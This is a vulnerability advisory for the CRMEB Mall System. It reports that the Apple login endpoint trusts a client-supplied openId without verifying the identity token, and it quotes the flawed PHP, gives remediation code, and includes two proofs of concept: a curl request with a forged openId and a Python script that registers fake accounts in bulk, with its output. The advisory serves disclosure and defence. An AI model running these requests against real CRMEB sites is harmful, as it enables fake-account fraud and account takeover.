# Apple Login Authentication Bypass via Identity Token Verification Missing

**Project**: CRMEB Mall System (CRMEB商城系统)

**Vendor**: CRMEB (https://www.crmeb.com)

**Vulnerable File**: `crmeb/app/api/controller/v1/LoginController.php`

**Affected Version**: v5.6.3 and earlier (<= v5.6.3)

**Vulnerability Type**: CWE-287 (Improper Authentication)

**CVSS v3.1 Score**: 9.8 (Critical)

---

## Description

The Apple login endpoint does not verify the Apple identity token (JWT) signature and blindly trusts the `openId` parameter sent from the client side. This allows attackers to forge arbitrary `openId` values to create unlimited fake accounts or login as any existing user if their Apple openId is known.

The root cause is the complete absence of Apple identity token verification. The application should validate the cryptographic signature of Apple's `identityToken` using Apple's public keys, but instead it directly uses the client-supplied `openId` without any verification.

---

## Vulnerability Analysis

**File**: `crmeb/app/api/controller/v1/LoginController.php`
**Lines**: 464-502

```php
public function appleLogin(Request $request, WechatServices $services)
{
    // VULNERABLE: Directly accepts openId from client without verification
    [$openId, $phone, $email, $captcha] = $request->postMore([
        ['openId', ''],      // Should be identityToken instead
        ['phone', ''],
        ['email', ''],
        ['captcha', '']
    ], true);

    // Optional SMS verification if phone is provided
    if ($phone) {
        // ... verify SMS code ...
    }

    // VULNERABLE: Generates email from unverified openId
    if ($email == '') $email = substr(md5($openId), 0, 12);

    // VULNERABLE: Constructs userInfo with unverified openId
    $userInfo = [
        'openId' => $openId,      // NO Apple signature verification
        'unionid' => '',
        'avatarUrl' => sys_config('h5_avatar'),
        'nickName' => $email,
    ];

    // VULNERABLE: Proceeds with authentication using unverified openId
    $token = $services->appAuth($userInfo, $phone, 'apple');

    if ($token) {
        return app('json')->success(410001, $token);  // Returns "Login Successful"
    }
}
```

**Vulnerability Details**:

1. **Line 467**: Accepts `openId` parameter directly from POST request without validation
2. **Line 486**: Uses unverified `openId` to generate email (predictable: `md5(openId)`)
3. **Line 488**: Constructs user info array with unverified `openId`
4. **Line 493**: Calls `appAuth()` which creates/updates user without verification
5. **Line 495**: Returns success with JWT token granting full access

**What Should Happen**:

Client should send `identityToken` (JWT from Apple SDK). Server should:
- Verify JWT signature using Apple's public keys from `https://appleid.apple.com/auth/keys`
- Verify issuer (`iss`) is `https://appleid.apple.com`
- Verify audience (`aud`) matches app's bundle ID
- Verify token is not expired
- Extract verified `openId` from `sub` claim

**What Actually Happens**:

Client sends `openId` directly (can be any string), server trusts it completely without cryptographic verification.

---

**File**: `crmeb/app/services/wechat/WechatServices.php`
**Lines**: 238-291

```php
public function appAuth(array $userData, string $phone, string $userType = 'app')
{
    // VULNERABLE: Uses unverified openId from client
    $openid = $userData['openId'] ?? "";

    $userInfo = [
        'phone' => $phone,
        'unionid' => $userData['unionId'] ?? '',
        'openid' => $openid,  // Unverified openId
        // ... other fields
    ];

    // Check if phone binding is required
    if (!$phone) {
        $storeUserMobile = sys_config('store_user_mobile');
        if ($openid && $storeUserMobile) {
            // VULNERABLE: Queries by unverified openId
            $uid = $this->dao->value(['openid' => $openid], 'uid');
            // ...
        }
    }

    // VULNERABLE: Creates/updates user with unverified openId
    $user = $wechatUser->wechatOauthAfter([$openid, $userInfo, ...]);

    // Generate JWT token for the user
    $token = $this->createToken((int)$user['uid'], 'api');

    return [
        'token' => $token['token'],
        'userInfo' => $user,
        'expires_time' => $token['params']['exp'],
        'isbind' => false
    ];
}
```

**Vulnerability Details**:

1. **Line 240**: Accepts unverified `openId` from client
2. **Line 268**: Uses unverified `openId` to query database
3. **Line 277**: Creates/updates user with unverified `openId`
4. **Line 278**: Generates valid JWT token granting full access

---

**File**: `crmeb/app/services/user/UserServices.php`
**Lines**: 124-178

```php
public function setUserInfo($user, int $spreadUid = 0, string $userType = 'wechat')
{
    $data = [
        'account' => $user['account'] ?? 'wx' . rand(1, 9999) . time(),
        'pwd' => $user['pwd'] ?? md5('123456'),  // Default password
        'nickname' => $user['nickname'] ?? '',
        'phone' => $user['phone'] ?? '',
        'user_type' => $userType,
        // ...
    ];

    // VULNERABLE: Inserts user into database without verification
    $res = $this->dao->save($data);

    // New user registration reward (can be abused)
    $this->rewardNewUser((int)$res->uid);

    return $res;
}
```

**Vulnerability Details**:

1. **Line 127**: Generates random account name
2. **Line 128**: Sets default password to `md5('123456')`
3. **Line 145**: Inserts user into database without any verification
4. **Line 149**: Triggers new user reward (abusable for fraud)

---

## Proof of Concept

### POC 1: Arbitrary Account Creation

```bash
curl -X POST "https://target.com/api/apple_login" \
  -H "Content-Type: application/json" \
  -d '{
    "openId": "fake_openid_12345",
    "phone": "",
    "email": ""
  }'
```

**Response** (Vulnerable System):
```json
{
  "status": 200,
  "code": "410001",
  "msg": "登录成功",
  "data": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...",
    "userInfo": {
      "uid": 5,
      "nickname": "d41d8cd98f00",
      "phone": "",
      "user_type": "apple",
      "status": 1
    },
    "expires_time": 1770483564,
    "isbind": false
  }
}
```
![1767894445724.png](https://youke3.picui.cn/s1/2026/01/09/695fed7779616.png)


### POC 2: Batch Account Registration

Automated batch registration to demonstrate unlimited account creation capability:

```python
#!/usr/bin/env python3
import requests
import time

target = "http://192.168.176.130:8011/api/apple_login"

for i in range(5):
    fake_openid = f"batch_test_{i}_{int(time.time())}"

    resp = requests.post(target, json={
        "openId": fake_openid,
        "phone": "",
        "email": ""
    })

    if resp.status_code == 200:
        data = resp.json()
        if data.get("code") == "410001":
            uid = data["data"]["userInfo"]["uid"]
            nickname = data["data"]["userInfo"]["nickname"]
            print(f"[+] Created account {i+1}: UID={uid}, openId={fake_openid}, nickname={nickname}")
        else:
            print(f"[-] Account {i+1} failed: {data.get('msg')}")
    else:
        print(f"[-] Account {i+1} HTTP error: {resp.status_code}")

    time.sleep(0.5)  # Small delay between requests
```

**Test Results**:
```
[+] Created account 1: UID=6, openId=poc_test_1767893672, nickname=1b7f9ab8a967
[+] Created account 2: UID=7, openId=poc_test_0_1767893726, nickname=cca620e88a10
[+] Created account 3: UID=8, openId=poc_test_1_1767893727, nickname=25c781ad1269
[+] Created account 4: UID=9, openId=poc_test_2_1767893728, nickname=975e92e347ca
[+] Created account 5: UID=10, openId=attacker_fake_openid_12345, nickname=e7c16cb94934
```

**Summary**:
- **Success Rate**: 5/5 (100%)
- **Total Time**: < 3 seconds
- **Attack Impact**: Attackers can create hundreds of fake accounts per minute
- **Database Verification**: All accounts successfully stored in database with unverified openIds

---

## Impact

1. **Unrestricted Account Creation**: Attackers can create unlimited fake accounts
2. **Account Takeover**: If Apple openId is known, attackers can login as that user
3. **Privilege Escalation**: Full user permissions including orders, payments, personal data
4. **Business Logic Abuse**: New user rewards, referral bonuses, coupon exploitation
5. **No Authentication Required**: Completely bypasses Apple's identity verification

---

## Database Evidence

![1767894499322.png](https://youke3.picui.cn/s1/2026/01/09/695fedae180ce.png)

![1767894528428.png](https://youke3.picui.cn/s1/2026/01/09/695feddb2803e.png)

**Key Findings**:
- `openid` is empty string (system accepts any value)
- `nickname` = `md5('')` first 12 chars = `d41d8cd98f00` (predictable)
- User successfully created with valid JWT token

---

## Affected Files

1. `crmeb/app/api/route/v1.php` - Route definition (line 31)
2. `crmeb/app/api/controller/v1/LoginController.php` - Vulnerable controller (lines 464-502)
3. `crmeb/app/services/wechat/WechatServices.php` - Service layer (lines 238-291)
4. `crmeb/app/services/wechat/WechatUserServices.php` - User creation logic (lines 276-384)
5. `crmeb/app/services/user/UserServices.php` - User data persistence (lines 124-178)
6. `crmeb/app/services/BaseServices.php` - Token generation (lines 93-121)

---

## Remediation

### Immediate Mitigation

1. **Disable Apple Login**:
   ```php
   // File: crmeb/app/api/route/v1.php
   // Route::post('apple_login', 'v1.LoginController/appleLogin')
   ```

2. **Force Phone Binding**:
   ```sql
   UPDATE eb_system_config SET value='1' WHERE menu_name='store_user_mobile';
   ```

### Permanent Fix

Implement proper Apple identity token verification:

```php
public function appleLogin(Request $request, WechatServices $services)
{
    // Change: Accept identityToken instead of openId
    [$identityToken, $phone, $email, $captcha] = $request->postMore([
        ['identityToken', ''],  // Changed from 'openId'
        ['phone', ''],
        ['email', ''],
        ['captcha', '']
    ], true);

    // Verify Apple identityToken
    try {
        $applePayload = $this->verifyAppleIdentityToken($identityToken);
        $openId = $applePayload['sub'];  // Extract verified openId
        $email = $applePayload['email'] ?? $email;
    } catch (\Exception $e) {
        return app('json')->fail('Apple identity verification failed');
    }

    // Use verified openId for authentication
    $userInfo = [
        'openId' => $openId,  // Verified from Apple
        'unionid' => '',
        'avatarUrl' => sys_config('h5_avatar'),
        'nickName' => $email ?? substr(md5($openId), 0, 12),
    ];

    $token = $services->appAuth($userInfo, $phone, 'apple');
    // ...
}
```

---

## References

- OWASP Broken Authentication: https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication
- CWE-287: Improper Authentication: https://cwe.mitre.org/data/definitions/287.html
- Apple Sign In Documentation: https://developer.apple.com/sign-in-with-apple/
- Verifying Apple Identity Token: https://developer.apple.com/documentation/signinwithapplerestapi/verifying_a_user
